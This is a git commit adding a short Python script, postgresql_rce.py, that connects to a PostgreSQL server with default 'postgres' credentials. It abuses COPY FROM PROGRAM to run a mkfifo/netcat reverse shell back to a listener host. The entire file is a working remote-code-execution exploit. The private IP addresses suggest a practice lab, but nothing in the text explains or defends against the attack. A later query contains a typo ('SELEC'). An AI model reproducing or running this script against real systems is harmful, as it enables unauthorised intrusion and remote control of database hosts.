f0b3240e1e4f28ed38f76e997f5164ad33a00ab3
squid22 <squid22@github.com>
2021-06-06 22:21:59 -0400

    Added the script

---
+++ postgresql_rce.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+import psycopg2
+
+
+RHOST = '192.168.217.47'
+RPORT = 5437
+LHOST = '192.168.49.217'
+LPORT = 80
+USER = 'postgres'
+PASSWD = 'postgres'
+
+with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
+    try:
+        cur = conn.cursor()
+        print("[!] Connected to the PostgreSQL database")
+        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
+        cur.execute('DROP TABLE IF EXISTS cmd_exec')
+        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
+        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
+        cur.execute('SELEC * from cmd_exec')
+        v = cur.fetchone()
+        #print(v)
+        cur.close()
+
+    except:
+        print(f"[!] Something went wrong")
